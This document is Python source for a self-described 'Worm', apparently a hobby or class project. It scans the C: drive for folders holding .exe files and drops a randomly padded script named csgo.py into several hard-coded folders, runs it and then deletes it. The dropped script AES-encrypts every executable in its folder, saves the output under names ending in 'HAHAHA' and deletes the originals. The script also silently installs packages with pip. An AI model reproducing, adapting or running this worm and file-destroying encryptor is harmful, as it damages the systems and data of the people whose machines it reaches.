import os
os.system("pip install pypiwin32 pycryptodome > /dev/null 2>&1")
import sys
import time
import threading
import shutil
import win32con
import win32gui
import random
from os import system


ROOTDIR = r"C:\\"
THIS_DIR = os.path.dirname(os.path.realpath(__file__))

class Worm:
    def __init__(self):
        self.target_dir_list = []
        self.directories_found = False
        self.own_path = os.path.realpath(__file__) # pode ser usado para apenas não encriptar a diretoria da worm

    def find_directories(self):
        for dirpath, dirnames, _ in os.walk(ROOTDIR):
            for dirname in dirnames:
                directory_path = os.path.join(dirpath, dirname)
                if directory_path != THIS_DIR:
                    try:
                        for f in os.listdir(directory_path):
                            if f.endswith(".exe"):
                                self.target_dir_list.append(directory_path)
                                break
                    except PermissionError:
                        pass

        self.directories_found = True

# C:/Program Files/Windows NT/Accessories -> target_dir_list[30]
    def spread(self):
        worm_poli = ""
        times = random.randrange(1, 25)
        for i in range(times):
            num = random.randrange(-sys.maxsize, sys.maxsize)
            worm_poli += "print(" + str(num) + ")\n"

        worm_poli += "\n"
        worm_poli += ENCRYPTOR

        target_list = ["C:/Users/w0rmer/Downloads/test3", "C:/Users/w0rmer/Documents/test", "C:/Users/w0rmer/Music/test2"]

        for target in target_list:
            with open(target + "/csgo.py", "w") as f:
                f.write(worm_poli)
            system("cd " + target + " && python.exe csgo.py && cd " + THIS_DIR)
            os.remove(target + "/csgo.py")


    def execute_worm(self):
        if not self.directories_found:
            self.find_directories()

        self.spread()

if __name__ == "__main__":
    ENCRYPTOR = """import os
import base64
import sys
from io import BytesIO
from Crypto import Random
from Crypto.Cipher import AES

THIS_DIR = os.path.dirname(os.path.realpath(__file__))

def encrypt(data, filename):
    with open(filename, "rb") as source:
        key = source.read(24)

    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CFB, iv)
    encrypted = iv + cipher.encrypt(data)

    return base64.b64encode(encrypted)

if __name__ == "__main__":
    for (dirpath, dirnames, filenames) in os.walk(THIS_DIR):
        break
        
    for file in filenames:
        if file.endswith(".exe"):
            with open(file, "rb") as f:
                data = f.read()

            destination = file + "HAHAHA"
            with open(destination, "wb") as fd:
                fd.write(encrypt(data, file))
                fd.close()
            os.remove(file)"""

    worm = Worm()
    worm.execute_worm()
